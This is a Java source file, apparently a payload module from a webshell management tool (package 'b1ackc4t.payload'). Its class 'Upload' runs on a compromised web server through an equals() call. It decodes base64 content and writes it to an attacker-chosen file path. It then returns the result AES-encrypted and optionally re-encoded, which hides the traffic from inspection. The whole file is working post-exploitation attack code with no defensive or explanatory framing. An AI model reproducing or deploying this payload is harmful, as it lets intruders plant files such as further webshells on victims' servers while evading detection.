package org.b1ackc4t.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.util.*;

public class Upload {
    public static String path;
    public static String content;
    private Object res;
    public static String key;
    public static int encode;
    public boolean equals(Object obj) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Object o;
        Method m;
        try {
            fill(obj);
            bos.write("1@".getBytes());
            bos.write(create().getBytes());
        } catch (Exception e) {
            try {
                bos.reset();
                bos.write("0@".getBytes());
            } catch (Exception r) {
            }
        }

        try {
            o = res.getClass().getMethod("getOutputStream").invoke(res);
            m = o.getClass().getMethod("write", byte[].class);
            byte[] r = encrypt(bos.toByteArray());
            bos.close();
            switch (encode) {
                case 0:
                    break;
                case 1:
                    r = new BigInteger(r).toString(16).getBytes();
                    break;
                case 2:
                    r = new BigInteger(r).toString(36).getBytes();
                    break;
                default:
                    if (System.getProperty("java.version").compareTo("1.8") >= 0) {
                        r = Base64.getEncoder().encode(r);
                    } else {
                        r = new sun.misc.BASE64Encoder().encode(r).getBytes();
                    }
            }
            m.invoke(o, r);
            o.getClass().getMethod("flush").invoke(o);
            o.getClass().getMethod("close").invoke(o);
//            Response.getOutputStream().write(this.Encrypt(bos.toByteArray()));
//            Response.getOutputStream().flush();
//            Response.getOutputStream().close();
        } catch (Exception e) {
        }
        return true;
    }

    private String create() throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path);
        byte[] rContent;
        if (System.getProperty("java.version").compareTo("1.8") >= 0) {
            rContent = Base64.getDecoder().decode(content);
        } else {
            rContent = new sun.misc.BASE64Decoder().decodeBuffer(content);
        }
        fso.write(rContent);
        fso.flush();
        fso.close();
        result = path + "上传完成，远程文件大小:" + (new File(path)).length();
        return result;
    }

    private byte[] encrypt(byte[] bs) throws Exception {
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(1, new SecretKeySpec(key.getBytes("utf-8"), "AES"));
        return c.doFinal(bs);
    }

    private void fill(Object obj) throws Exception {
        List<Object> p = (List)obj;
        res = p.get(0);
        if (p.size() > 1) {
            String[] tmp = ((String) p.get(1)).split(";");
            path = tmp[0];
            content = tmp[1];
        }
        res.getClass().getMethod("setCharacterEncoding", String.class).invoke(res, "UTF-8");
    }
}
